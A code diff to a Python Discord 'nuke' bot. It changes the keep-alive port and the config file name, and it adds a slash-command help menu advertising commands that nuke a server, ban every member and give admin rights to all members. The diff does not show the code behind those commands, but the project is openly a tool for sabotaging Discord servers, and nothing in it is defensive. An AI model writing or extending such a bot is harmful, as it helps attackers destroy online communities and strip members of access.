@@ -26,7 +26,7 @@ def home():
 
 
 def run():
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=8080)
 
 
 Thread(target=run).start()
@@ -35,7 +35,7 @@ colorama.init()
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=".", intents=intents)
 bot.remove_command("help")
-with open('config.json') as f:
+with open('config1.json') as f:
     data = json.load(f)
     token = data["TOKEN"]
 
@@ -43,7 +43,18 @@ with open('config.json') as f:
 @bot.event
 async def on_ready():
     print(f"{Fore.LIGHTCYAN_EX}NUKER is online")
+    await bot.tree.sync()
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f".nuke"))
 
+
+@bot.tree.command(name="help", description="Help with commands")
+async def help(interaction: discord.Interaction):
+    embed = discord.Embed(title="Nuke", color=0xaf1aff)
+    embed.add_field(value="This is the gbhx nuke bot, available commands:", inline=False)
+    embed.add_field(value=".nuke, nukes the server", inline=False)
+    embed.add_field(value=".banAll, bans all the members", inline=False)
+    embed.add_field(value=".admin, gives admin to all the members on the server", inline=False)
+    await interaction.response.send_message(embed=embed)
 
 
 @bot.command(pass_context=True)
